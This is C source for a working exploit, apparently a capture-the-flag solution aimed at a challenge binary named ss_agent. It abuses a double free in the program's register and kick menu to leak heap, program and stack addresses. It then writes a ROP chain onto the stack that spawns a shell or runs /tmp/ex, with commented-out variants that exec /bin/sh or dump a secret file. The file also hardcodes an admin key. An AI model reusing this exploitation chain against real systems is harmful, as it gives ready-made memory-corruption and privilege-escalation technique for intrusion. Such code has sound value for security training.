#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <poll.h>
#include <pthread.h>
#include <errno.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <poll.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <assert.h>
#include <x86intrin.h>
#include <errno.h>
#include <sys/wait.h>
void errExit(char* msg)
{
	puts(msg);
	exit(-1);
}


char buf[0x10000];
char buf2[0x10000];

#define str_memcmp(buf, s) memcmp((buf), (s), (strlen(s)))
#define write_str(fd, s) assert(write((fd), (s), strlen(s)) == strlen(s))

void recv_all(int fd, void* buf, size_t len)
{
	size_t off = 0;
	while (off < len)
	{
		ssize_t r = read(fd, (char*)buf + off, len - off);
		assert(r > 0);
		off += r;
		// printf("%.2x %c\n", ((char*)buf)[i], ((char*)buf)[i]);
	}
}

void recv_str(int proc_stdout, char* s)
{
	size_t l = strlen(s);
	// printf("l = %lu\n", l);
	// memset(buf, 'B', sizeof(buf));
	recv_all(proc_stdout, buf, l);
	write(STDOUT_FILENO, buf, l);
	assert(str_memcmp(buf, s) == 0);
}

void recv_menu(int proc_stdout)
{
	// memset(buf, 'M', sizeof(buf));
	recv_all(proc_stdout, buf, 205 - 78);
	write(STDOUT_FILENO, buf, 205 - 78);
	assert(str_memcmp(buf + 186 - 78, "Input your choice:\n") == 0);
}
int pid;
void new_process(void (*exp_func)(int proc_stdout, int proc_stdin))
{
	// create unnamed pipe for tackling stdout/stdin
	int stdout_fd[2];
	int stdin_fd[2];
	assert(pipe(stdout_fd) == 0);
	assert(pipe(stdin_fd) == 0);

	pid = fork();
	if (pid < 0)
	{
		printf("%d ", errno);
		errExit("pid < 0");
	}
	else if (pid != 0)
	{ // parent process, start exploitation
		close(stdout_fd[1]);
		close(stdin_fd[0]);
		exp_func(stdout_fd[0], stdin_fd[1]);
		close(stdout_fd[0]);
		close(stdin_fd[1]);
		assert(wait(NULL) > 0);
		// system("ps -ef");
	}
	else
	{ // child process, create ss_agent process
		close(stdout_fd[0]);
		close(stdin_fd[1]);
		dup2(stdout_fd[1], STDOUT_FILENO);
		dup2(stdout_fd[1], STDERR_FILENO);
		dup2(stdin_fd[0], STDIN_FILENO);
		char* const args[] = {"/challenge/ss_agent", NULL};
		execv("/challenge/ss_agent", args);
		abort();
	}
}

void regist(int proc_stdout, int proc_stdin,
	size_t name_length, void* input, size_t len)
{
	write_str(proc_stdin, "1\n");
	recv_str(proc_stdout, "How long is your name ?\n");
	sprintf(buf, "%lu\n", name_length);
	write_str(proc_stdin, buf);
	recv_str(proc_stdout, "What is your name ?\n");
	if (input == NULL)
	{
		write_str(proc_stdin, "\n");
	}
	else
	{
		write(proc_stdin, input, len);
	}
	recv_str(proc_stdout, "Hello ");
	recv_all(proc_stdout, buf2, name_length);
	recv_str(proc_stdout, "\nSuccessfully register\n\n");
	recv_menu(proc_stdout);
}

void kick(int proc_stdout, int proc_stdin, size_t last_len)
{
	write_str(proc_stdin, "4\n");
	recv_str(proc_stdout, "Input admin key:\n");
	write_str(proc_stdin, "yIqOWG6uyE2xldHdJef7AnsRNS01Px1I\n");
	recv_str(proc_stdout, "Checking...\n");
	recv_str(proc_stdout, "Pass check\n");
	recv_str(proc_stdout, "Last registered user is ");
	recv_all(proc_stdout, buf, last_len);
	recv_str(proc_stdout, "\nUser kicked out\n\n");
	recv_menu(proc_stdout);
}

void exploit(int proc_stdout, int proc_stdin)
{
	uintptr_t qword[2] = {0, '\n'};
	recv_str(proc_stdout, "This is user mode agent program for Secure Storage !\n");
	recv_str(proc_stdout, "What do you want to do ?\n");
	recv_menu(proc_stdout);
	regist(proc_stdout, proc_stdin, 0x190, NULL, 0);
	kick(proc_stdout, proc_stdin, 0x190);
	kick(proc_stdout, proc_stdin, 0x190);
	regist(proc_stdout, proc_stdin, 0x190, NULL, 0);
	uintptr_t heap_addr = *(uintptr_t*)buf2;
	printf("0x%lx\n", heap_addr);

	*qword = heap_addr - 0x1300;
	regist(proc_stdout, proc_stdin, 0x190, &qword, 9);
	regist(proc_stdout, proc_stdin, 0x190, NULL, 0);
	regist(proc_stdout, proc_stdin, 0x190, NULL, 0);

	uintptr_t prog_addr = *(uintptr_t*)buf2 - 0xc9960;
	printf("0x%lx\n", prog_addr);

	// use double free again to leak stack
	regist(proc_stdout, proc_stdin, 0x180, NULL, 0);
	kick(proc_stdout, proc_stdin, 0x180);
	kick(proc_stdout, proc_stdin, 0x180);
	*qword = heap_addr - 0xfa0;
	regist(proc_stdout, proc_stdin, 0x180, &qword, 9);
	regist(proc_stdout, proc_stdin, 0x180, NULL, 0);
	regist(proc_stdout, proc_stdin, 0x180, NULL, 0);

	uintptr_t stack_addr = *(uintptr_t*)buf2 - 0x68;
	printf("0x%lx\n", stack_addr);

	// use double free again to rewrite stack
	regist(proc_stdout, proc_stdin, 0x170, NULL, 0);
	kick(proc_stdout, proc_stdin, 0x170);
	kick(proc_stdout, proc_stdin, 0x170);
	*qword = stack_addr;
	regist(proc_stdout, proc_stdin, 0x170, &qword, 9);
	regist(proc_stdout, proc_stdin, 0x170, NULL, 0);
	uintptr_t rop[0x100];
	size_t i = 0;
	uintptr_t pop_rdi = prog_addr + 0x94c6;
	uintptr_t pop_rsi = prog_addr + 0x1a343;
	uintptr_t pop_rdx = prog_addr + 0x53b15;
	uintptr_t pop_rax = prog_addr + 0x1f8f4;
	/*/ /bin/sh
	rop[i++] = pop_rax;
	rop[i++] = 59;
	rop[i++] = pop_rsi;
	rop[i++] = stack_addr + 9 * 8;
	rop[i++] = pop_rdx;
	rop[i++] = 0;
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 11 * 8;
	rop[i++] = prog_addr + 0xabcc; // syscall
	rop[i++] = stack_addr + 11 * 8;
	rop[i++] = 0;
	strcpy((char*)(rop + i++), "/bin/sh");
	//*/
	/* show secret2.txt
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 19 * 8;
	rop[i++] = pop_rsi;
	rop[i++] = 0;
	rop[i++] = prog_addr + 0x53940; // open
	rop[i++] = pop_rdi;
	rop[i++] = 3;
	rop[i++] = pop_rsi;
	rop[i++] = stack_addr + 19 * 8;
	rop[i++] = pop_rdx;
	rop[i++] = 0x1000;
	rop[i++] = prog_addr + 0x53b00; // read
	rop[i++] = pop_rdi;
	rop[i++] = 1;
	rop[i++] = pop_rsi;
	rop[i++] = stack_addr + 19 * 8;
	rop[i++] = pop_rdx;
	rop[i++] = 0x1000;
	rop[i++] = prog_addr + 0x53bd0; // write
	strcpy((char*)(rop + i), "/challenge/secret2.txt");
	i += 3;
	*/
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 27 * 8;
	rop[i++] = pop_rsi;
	rop[i++] = 2;
	rop[i++] = prog_addr + 0x53940; // open
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 27 * 8;
	rop[i++] = pop_rsi;
	rop[i++] = 2;
	rop[i++] = prog_addr + 0x53940; // open
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 27 * 8;
	rop[i++] = pop_rsi;
	rop[i++] = 2;
	rop[i++] = prog_addr + 0x53940; // open
	rop[i++] = pop_rax;
	rop[i++] = 59;
	rop[i++] = pop_rsi;
	rop[i++] = stack_addr + 24 * 8;
	rop[i++] = pop_rdx;
	rop[i++] = 0;
	rop[i++] = pop_rdi;
	rop[i++] = stack_addr + 26 * 8;
	rop[i++] = prog_addr + 0xabcc; // syscall
	rop[i++] = stack_addr + 26 * 8;
	rop[i++] = 0;
	strcpy((char*)(rop + i++), "/tmp/ex");
	strcpy((char*)(rop + i++), "/dev/ss");
	rop[i] = '\n';
	regist(proc_stdout, proc_stdin, 0x170, rop, i * 8 + 1);
	// getchar();
	write_str(proc_stdin, "5\n"); // exit
	system("ps -ef");
	while (1)
	{
		puts("We have root now!");

		memset(buf, 0, sizeof(buf));
		ssize_t r = read(proc_stdout, buf, sizeof(buf));
		write(STDOUT_FILENO, buf, r);

		// puts("----------"); // cannot be executed

		memset(buf, 0, sizeof(buf));
		read(STDIN_FILENO, buf, sizeof(buf));
		write(proc_stdin, buf, strlen(buf));

	}
}

int main(int argc, char const *argv[])
{
	new_process(exploit);
	puts("Exit");
	return 0;
}

/*
1. cat /proc/kallsyms | grep cleanup_module
2. x/10i, x/10gx
3. address of release is base address

mmap: b *+0x815
fault: b *+0x3e0
mmap_buffer: +0x669
*/
